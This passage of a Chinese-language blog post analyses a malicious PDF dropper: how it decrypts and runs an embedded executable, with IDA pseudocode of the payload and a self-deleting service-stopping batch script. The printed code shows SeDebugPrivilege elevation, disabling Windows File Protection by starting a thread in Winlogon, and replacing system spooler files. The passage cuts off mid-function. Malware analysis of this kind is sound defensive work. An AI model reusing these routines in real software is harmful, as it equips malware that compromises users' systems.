                     data-src="http://imgsrc.baidu.com/forum/pic/item/21a4462309f7905241e96df449f3d7ca7acbd502.jpg"
                     
                ></p>
<p>接下来调用函数<code>SetFRilePointer</code>，将函数指针偏移到文件0x1200的位置，这里就不逐步查看了，直接往下走，调用<code>ReadFile</code>函数，读取该位置8字节到栈上0x0c0c0cFc<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fa129df81fafa40f4afb0518.jpg"
                     
                ></p>
<p>检查一下几点固定值，若相等，则确定为恶意文件本身，然后调用<code>GlobalAlloc</code>函数，从堆中分配一定的字节，然后填充0，大小为之前获得的那个值，分配好空间后，再次调用<code>readFile</code>将恶意pdf读入内存中<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb1372a616d99854564e93584b28.jpg"
                     
                ></p>
<p>读出来后，使用异或解密 PDF 中的一个 stream 流对象<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/faedab64034f78f066308f393c310a55b2191cc4.jpg"
                     
                ></p>
<p>解密后可以看到标红这里有一个<code>svrhost.exe</code>字符串，他被拼接到右边栈0x0c0c0B40的临时目录地址上，调用<code>lcreate</code>函数来创建该临时文件，如下<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffc853caa78fc014a90f703eae2.jpg"
                     
                ></p>
<p>直接步过，然后到相应文件夹下查看<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5050faf598c035e5dde6116ef6.jpg"
                     
                ></p>
<p>可以看到确实有这个文件了，交换前0x200个字节，使前 200 字节恢复成正常的 PE 文件格式，然后调用 <code>lwrite </code>函数把解密后的 PE 文件写进 <code>svrhost.exe</code> 中<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/2934349b033b5bb538ba353473d3d539b700bc8f.jpg"
                     
                ></p>
<p>调用<code>WinExec</code>函数进行执行该可执行文件，将他复制一份到IDA中打开<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/f7246b600c33874409eb39b6140fd9f9d62aa0ca.jpg"
                     
                ></p>
<p>IDA反编译得到下面main函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// edi</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (__stdcall *v14)(LPCSTR, LPCSTR, DWORD); <span class="comment">// edi</span></span><br><span class="line">  CHAR CmdLine[<span class="number">1021</span>]; <span class="comment">// [esp+18h] [ebp-728h] BYREF</span></span><br><span class="line">  __int16 v16; <span class="comment">// [esp+415h] [ebp-32Bh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+417h] [ebp-329h]</span></span><br><span class="line">  CHAR Filename[<span class="number">257</span>]; <span class="comment">// [esp+418h] [ebp-328h] BYREF</span></span><br><span class="line">  __int16 v19; <span class="comment">// [esp+519h] [ebp-227h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+51Bh] [ebp-225h] BYREF</span></span><br><span class="line">  CHAR v21[<span class="number">257</span>]; <span class="comment">// [esp+51Ch] [ebp-224h] BYREF</span></span><br><span class="line">  __int16 v22; <span class="comment">// [esp+61Dh] [ebp-123h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+61Fh] [ebp-121h] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">257</span>]; <span class="comment">// [esp+620h] [ebp-120h] BYREF</span></span><br><span class="line">  __int16 v25; <span class="comment">// [esp+721h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+723h] [ebp-1Dh]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+728h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(Buffer));</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  GetSystemDirectoryA(Buffer, <span class="number">0x104</span>u);</span><br><span class="line">  v3 = &amp;v23;</span><br><span class="line">  <span class="keyword">while</span> ( *++v3 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;\\setup\\&quot;</span>);</span><br><span class="line">  v5 = &amp;v23;</span><br><span class="line">  <span class="keyword">while</span> ( *++v5 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;hid128.log&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  GetSystemDirectoryA(v21, <span class="number">0x104</span>u);</span><br><span class="line">  v7 = &amp;v20;</span><br><span class="line">  <span class="keyword">while</span> ( *++v7 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;\\cmd.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(CmdLine, <span class="number">0</span>, <span class="keyword">sizeof</span>(CmdLine));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(CmdLine, <span class="string">&quot;%s /c echo 12345&gt;%s&quot;</span>, v21, Buffer);<span class="comment">// 格式化输出</span></span><br><span class="line">                                                <span class="comment">// C:\WINDOWS\system32\cmd.exe /c echo 12345&gt;C:\WINDOWS\system32\setup\hid128.log</span></span><br><span class="line">  WinExec(CmdLine, <span class="number">0</span>);</span><br><span class="line">  Sleep(<span class="number">0xBB8</span>u);</span><br><span class="line">  FileA = CreateFileA(Buffer, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( FileA == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(FileA);</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    sub_402180();                               <span class="comment">// 关闭文件保护函数</span></span><br><span class="line">  <span class="built_in">memset</span>(Filename, <span class="number">0</span>, <span class="keyword">sizeof</span>(Filename));</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_402210(Filename) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40321D(<span class="string">&quot;Not configed, exit...\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = CreateFileA(Buffer, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(v12);</span><br><span class="line">    v13 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  GetSystemDirectoryA(::Buffer, <span class="number">0x104</span>u);</span><br><span class="line">  *(_WORD *)&amp;::Buffer[<span class="built_in">strlen</span>(::Buffer)] = <span class="number">92</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(::Buffer, <span class="string">&quot;spoolss.dll&quot;</span>);</span><br><span class="line">  GetSystemDirectoryA(byte_4127E8, <span class="number">0x104</span>u);</span><br><span class="line">  *(_WORD *)&amp;byte_4127E8[<span class="built_in">strlen</span>(byte_4127E8)] = <span class="number">92</span>;</span><br><span class="line">  GetSystemDirectoryA(byte_4128F0, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_4128F0, <span class="string">&quot;\\Setup\\&quot;</span>);</span><br><span class="line">  GetSystemDirectoryA(byte_4129F8, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_4129F8, <span class="string">&quot;\\catroot\\&quot;</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(ExistingFileName, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(ExistingFileName, aSpoolsvExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412C08, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412C08, aSpoolerExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412D10, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412D10, aSetjupryExe);</span><br><span class="line">  <span class="built_in">strcat</span>(NewFileName, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(NewFileName, aFxjssocmExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412F20, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412F20, aMsxml0rDll);</span><br><span class="line">  <span class="built_in">strcat</span>(FileName, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(FileName, aMsxml0Dll);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_413130, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_413130, aMsxm32Dll);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  sub_401FA0(ServiceName);</span><br><span class="line">  dword_413234 = sub_401A00(byte_413130);</span><br><span class="line">  <span class="keyword">if</span> ( dword_413234 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = (<span class="type">void</span> (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;</span><br><span class="line">    MoveFileExA(ExistingFileName, byte_412C08, <span class="number">3u</span>);</span><br><span class="line">    CopyFileA(NewFileName, ExistingFileName, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401000(ExistingFileName, (<span class="type">int</span>)aMsxml0rDll, (<span class="type">int</span>)aEntrypoint) == <span class="number">1</span> )</span><br><span class="line">      sub_40321D(<span class="string">&quot;Install Again Successfully!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;Install Again Failed!\r\n&quot;</span>);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CopyFileA(ExistingFileName, NewFileName, <span class="number">0</span>);</span><br><span class="line">    v14 = (<span class="type">void</span> (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;</span><br><span class="line">    MoveFileExA(ExistingFileName, byte_412C08, <span class="number">3u</span>);</span><br><span class="line">    CopyFileA(NewFileName, ExistingFileName, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401000(ExistingFileName, (<span class="type">int</span>)aMsxml0rDll, (<span class="type">int</span>)aEntrypoint) == <span class="number">1</span> )</span><br><span class="line">      sub_40321D(<span class="string">&quot;New Install Successfully!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;New Install Failed!\r\n&quot;</span>);</span><br><span class="line">    CopyFileA(ExistingFileName, byte_412D10, <span class="number">0</span>);</span><br><span class="line">    CopyFileA(::Buffer, byte_413130, <span class="number">0</span>);</span><br><span class="line">    sub_401D70(byte_4128F0, byte_4129F8);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401AD0(ServiceName);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401A00(byte_412F20) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401A00(FileName) )</span><br><span class="line">      DeleteFileA(FileName);</span><br><span class="line">    v14(byte_412F20, FileName, <span class="number">3u</span>);</span><br><span class="line">    sub_402110(byte_412F20, &amp;unk_40B148, <span class="number">0x6E00</span>u);</span><br><span class="line">    sub_4023F0(byte_412F20);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401CE0(byte_412F20, ::Buffer) )</span><br><span class="line">      sub_40321D(<span class="string">&quot;Upgrade Success!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;Upgrade Failed!\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_402110(byte_412F20, &amp;unk_40B148, <span class="number">0x6E00</span>u);</span><br><span class="line">    sub_4023F0(byte_412F20);</span><br><span class="line">    sub_401CE0(byte_412F20, ::Buffer);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-1</span>;</span><br><span class="line">  sub_401E20(ServiceName);</span><br><span class="line">  sub_401B70(<span class="number">4205738</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到该函数首先是创建了一个log文件，然后输出12345到其中，之后进入注释的关闭文件保护函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_402180</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 Version; <span class="comment">// ax</span></span><br><span class="line">  __int16 v3; <span class="comment">// ax</span></span><br><span class="line">  HMODULE LibraryA; <span class="comment">// eax</span></span><br><span class="line">  DWORD (__stdcall *ProcAddress)(LPVOID); <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v7; <span class="comment">// eax</span></span><br><span class="line">  DWORD ThreadId; <span class="comment">// [esp+0h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ThreadId = (DWORD)this;</span><br><span class="line">  sub_4016F0();                                 <span class="comment">// 提权函数，启用SeDebugPreviledge</span></span><br><span class="line">  sub_401780(<span class="string">&quot;Winlogon.exe&quot;</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  Version = GetVersion();</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)Version == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = HIBYTE(Version);</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      LibraryA = LoadLibraryA(<span class="string">&quot;sfc.dll&quot;</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">      v1 = LibraryA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v3 == <span class="number">1</span> || (_BYTE)v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LibraryA = LoadLibraryA(<span class="string">&quot;sfc_os.dll&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">  ProcAddress = (DWORD (__stdcall *)(LPVOID))GetProcAddress(v1, (LPCSTR)<span class="number">2</span>);</span><br><span class="line">  ThreadId = <span class="number">0</span>;</span><br><span class="line">  v6 = (<span class="type">void</span> *)sub_4018B0(<span class="string">&quot;Winlogon.exe&quot;</span>);</span><br><span class="line">  v7 = CreateRemoteThread(v6, <span class="number">0</span>, <span class="number">0</span>, ProcAddress, <span class="number">0</span>, <span class="number">0</span>, &amp;ThreadId);</span><br><span class="line">  WaitForSingleObject(v7, <span class="number">0xFA0</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数<code>sub_4016F0()</code>是一个典型的提权函数，他的名字应该是<code>ElvatePriviledge</code>,作用是获取 <code>SeDebugPrivilege</code> 权限并设置 <code>SE_PRIVILEGE_ENABLED </code>属性来开启权限,(这里没符号表很难受,跟进查看如下)</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4016F0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  HANDLE TokenHandle; <span class="comment">// [esp+0h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">LUID</span> <span class="title">Luid</span>;</span> <span class="comment">// [esp+4h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> <span class="title">NewState</span>;</span> <span class="comment">// [esp+Ch] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  <span class="keyword">if</span> ( !OpenProcessToken(CurrentProcess, <span class="number">0x28</span>u, &amp;TokenHandle) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !LookupPrivilegeValueA(<span class="number">0</span>, <span class="string">&quot;SeDebugPrivilege&quot;</span>, &amp;Luid) )</span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(TokenHandle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  NewState.Privileges[<span class="number">0</span>].Luid = Luid;</span><br><span class="line">  NewState.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">  NewState.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line">  AdjustTokenPrivileges(TokenHandle, <span class="number">0</span>, &amp;NewState, <span class="number">0x10</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  CloseHandle(TokenHandle);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>回到主函数，该函数会串讲停止打印服务脚本并且运行,这里会有一个字符串<code>Spooler</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/86d6277f9e2f070884b338caac24b899a801f242.jpg"
                     
                ></p>
<p>用OD进行动态调试<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2904b4c804dc25bc315d607cff.jpg"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9815f29137c01213fb90e918d.jpg"
                     
                ></p>
<p>可以看到会创建一个<code>Temp_unstop.bat</code>,然后我们写入内容</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop <span class="string">&quot;Spooler&quot;</span></span><br><span class="line">net stop <span class="string">&quot;Spooler&quot;</span></span><br><span class="line">del <span class="string">&quot;C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\_unstop.bat&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>它是为了关闭Spooler服务，然后删除自己。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">sub_401FA0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// edi</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// esi</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+14h] [ebp-61Ch] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">257</span>]; <span class="comment">// [esp+18h] [ebp-618h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+119h] [ebp-517h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+11Bh] [ebp-515h]</span></span><br><span class="line">  CHAR Filename[<span class="number">257</span>]; <span class="comment">// [esp+120h] [ebp-510h] BYREF</span></span><br><span class="line">  __int16 v9; <span class="comment">// [esp+221h] [ebp-40Fh]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+223h] [ebp-40Dh]</span></span><br><span class="line">  CHAR v11[<span class="number">1021</span>]; <span class="comment">// [esp+228h] [ebp-408h] BYREF</span></span><br><span class="line">  __int16 v12; <span class="comment">// [esp+625h] [ebp-Bh]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+627h] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(Buffer));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">GetTempPathA</span>(<span class="number">0x104</span>u, Buffer);</span><br><span class="line">  v1 = (<span class="type">char</span> *)&amp;NumberOfBytesWritten + <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *++v1 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, <span class="string">&quot;_unstop.bat&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Filename, <span class="number">0</span>, <span class="built_in">sizeof</span>(Filename));</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">GetModuleFileNameA</span>(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">  FileA = <span class="built_in">CreateFileA</span>(Buffer, 